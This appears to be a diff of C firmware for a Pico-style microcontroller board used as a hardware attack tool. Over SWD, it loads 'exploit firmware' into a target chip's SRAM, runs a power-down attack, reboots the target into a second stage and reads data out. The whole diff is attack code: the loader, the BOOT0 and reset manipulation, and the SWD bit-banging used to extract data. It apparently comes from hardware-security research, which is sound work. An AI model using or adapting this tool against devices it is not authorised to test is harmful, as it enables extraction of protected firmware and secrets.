@@ -37,6 +37,7 @@
 #include "config.h"
 #include "payload.h"
 
+int bmp_loader_launcher(const char *data, uint32_t length, uint32_t offset);
 int bmp_loader(const char *data, uint32_t length, uint32_t offset, bool check_only);
 
 // Exact steps for attack:
@@ -136,20 +137,20 @@ __attribute__((section(".data"))) static uint32_t powerdown_attack(void)
 
 static void send_word(uint32_t packet, uint8_t count)
 {
+	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
 	for (int i = count; i > 0; i -= 1) {
 		uint8_t bit = !!(packet & (1 << (i - 1)));
-		printf("b: %d\n", bit);
 		gpio_put(SWDIO_PIN, bit);
 		sleep_ms(1);
 		gpio_put(SWCLK_PIN, 0);
 		sleep_ms(1);
 		gpio_put(SWCLK_PIN, 1);
 	}
-	printf("--\n");
 }
 
 static uint32_t receive_word(uint8_t count)
 {
+	gpio_set_dir(SWDIO_PIN, GPIO_IN);
 	uint32_t result = 0;
 	for (int i = 0; i < count; i++) {
 		gpio_put(SWCLK_PIN, 0);
@@ -163,15 +164,25 @@ static uint32_t receive_word(uint8_t count)
 static uint32_t packet_txrx(uint32_t packet)
 {
 	send_word(0x5ad7, 16);
+	sleep_ms(500);
+
 	send_word(packet, 32);
+	sleep_ms(500);
+
 	// Turnaround
-	gpio_set_dir(SWDIO_PIN, GPIO_IN);
 	receive_word(1);
+	sleep_ms(500);
+
 	uint32_t header = receive_word(16);
+	sleep_ms(500);
+
 	uint32_t response = receive_word(32);
+	sleep_ms(500);
+
 	// Turnaround
-	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
 	receive_word(1);
+	sleep_ms(500);
+
 	if ((header & 0xffff) != 0x734f) {
 		printf("Invalid header: Got %04x, expected 0x734f\n", header);
 	}
@@ -232,53 +243,64 @@ int main(void)
 	// Validate that the target is no longer in reset.
 	validate_reset();
 
-	// Load the exploit firmware onto the target
-	while (bmp_loader(payload, sizeof(payload), 0x20000000, false) != 0) {
-		printf("Target not found... retrying\n");
-		handle_control(500);
+	if (1) {
+		while (bmp_loader_launcher(payload, sizeof(payload), 0x20000000) != 0) {
+			printf("Target not found... retrying\n");
+			handle_control(500);
+		}
+
+		gpio_set_dir(SWCLK_PIN, GPIO_OUT);
+		gpio_set_dir(SWDIO_PIN, GPIO_OUT);
+		gpio_put(SWCLK_PIN, true);
+		gpio_put(SWDIO_PIN, true);
+
+		printf("Booted directly into stage 2\n");
+	} else {
+		// Load the exploit firmware onto the target
+		while (bmp_loader(payload, sizeof(payload), 0x20000000, false) != 0) {
+			printf("Target not found... retrying\n");
+			handle_control(500);
+		}
+
+		printf("Connected to target. Firmware is now loaded into SRAM. Device is in reset.\n");
+		sleep_ms(100);
+
+		// Set SWCLK and SWDIO pins to inputs to prevent them from powering the target.
+		gpio_set_dir(SWCLK_PIN, GPIO_IN);
+		gpio_set_dir(SWDIO_PIN, GPIO_IN);
+
+		// Set BOOT0 to high to ensure the SRAM payload is executed
+		gpio_put(BOOT0_PIN, true);
+
+		// Deassert reset. This will boot into Stage 1 when power is reapplied.
+		gpio_set_dir(RESET_PIN, GPIO_IN);
+
+		uint32_t count;
+
+		count = powerdown_attack();
+		printf("Target powered off after %d ticks\n", count);
+
+		sleep_ms(10);
+
+		// Set SWCLK and SWDIO to outputs and drive them high. This
+		// will be the basis of bidirectional communication.
+		gpio_set_dir(SWCLK_PIN, GPIO_OUT);
+		gpio_set_dir(SWDIO_PIN, GPIO_OUT);
+		gpio_put(SWCLK_PIN, true);
+		gpio_put(SWDIO_PIN, true);
+
+		printf("Press 'c' to continue into stage 2\n");
+		while (handle_control(500) != 'c') {
+		}
+		printf("Resetting target into stage 2\n");
+
+		// Reset the board again with BOOT0 held low. This will cause it
+		// to boot into stage 2.
+		gpio_put(BOOT0_PIN, 0);
+		gpio_set_dir(RESET_PIN, GPIO_OUT);
+		sleep_ms(10);
+		gpio_set_dir(RESET_PIN, GPIO_IN);
 	}
-
-	printf("Connected to target. Firmware is now loaded into SRAM. Device is in reset.\n");
-	sleep_ms(100);
-#if 1
-	// Set SWCLK and SWDIO pins to inputs since we'll be using them
-	// to exfiltrate data. Additionally, we don't want to power the
-	// target via phantom current on the SWD pins.
-	gpio_set_dir(SWCLK_PIN, GPIO_IN);
-	gpio_set_dir(SWDIO_PIN, GPIO_IN);
-
-	// Set BOOT0 to high to ensure the SRAM payload is executed
-	gpio_put(BOOT0_PIN, 1);
-
-	// Deassert reset. This will boot into Stage 1 when power is reapplied.
-	gpio_set_dir(RESET_PIN, GPIO_IN);
-
-	uint32_t count;
-
-	count = powerdown_attack();
-	printf("Target powered off after %d ticks\n", count);
-
-	sleep_ms(10);
-
-	// Set SWCLK and SWDIO to outputs and drive them high. This
-	// will be the basis of bidirectional communication.
-	gpio_set_dir(SWCLK_PIN, GPIO_OUT);
-	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
-	gpio_put(SWCLK_PIN, true);
-	gpio_put(SWDIO_PIN, true);
-
-	printf("Press 'c' to continue into stage 2\n");
-	while (handle_control(500) != 'c') {
-	}
-	printf("Resetting target into stage 2\n");
-
-	// Reset the board again with BOOT0 held low. This will cause it
-	// to boot into stage 2.
-	gpio_put(BOOT0_PIN, 0);
-	gpio_set_dir(RESET_PIN, GPIO_OUT);
-	sleep_ms(10);
-	gpio_set_dir(RESET_PIN, GPIO_IN);
-#endif
 
 	printf("Reading data from target...\n");
 
@@ -286,18 +308,6 @@ int main(void)
 	int last_swclk = 0;
 	int last_swdio = 0;
 	while (true) {
-		// int swclk = gpio_get(SWCLK_PIN);
-		// int swdio = gpio_get(SWDIO_PIN);
-
-		// if (swclk != last_swclk) {
-		// 	printf("SWCLK %d -> %d\n", last_swclk, swclk);
-		// 	last_swclk = swclk;
-		// }
-
-		// if (swdio != last_swdio) {
-		// 	printf("SWDIO %d -> %d\n", last_swdio, swdio);
-		// 	last_swdio = swdio;
-		// }
 		uint8_t c = handle_control(1);
 
 		if (c == 's') {
@@ -310,22 +320,5 @@ int main(void)
 			}
 		}
 
-		// int c;
-		// if (uart_is_readable(UART_ID)) {
-		// 	c = uart_getc(UART_ID);
-		// 	putchar(c);
-		// 	pwm_set_gpio_level(LED_PIN, c); // LED will change intensity based on UART data
-		// 	stalls = 0;
-		// } else {
-		// 	// If no data is received for a while, turn off the LED
-		// 	if (++stalls == UART_STALLS_FOR_LED_OFF)
-		// 		pwm_set_gpio_level(LED_PIN, 0);
-		// }
-
-		// c = getchar_timeout_us(0);
-		// if (c != PICO_ERROR_TIMEOUT) {
-		// 	// putchar(c); // Echo back
-		// 	uart_putc_raw(UART_ID, c);
-		// }
 	}
 }
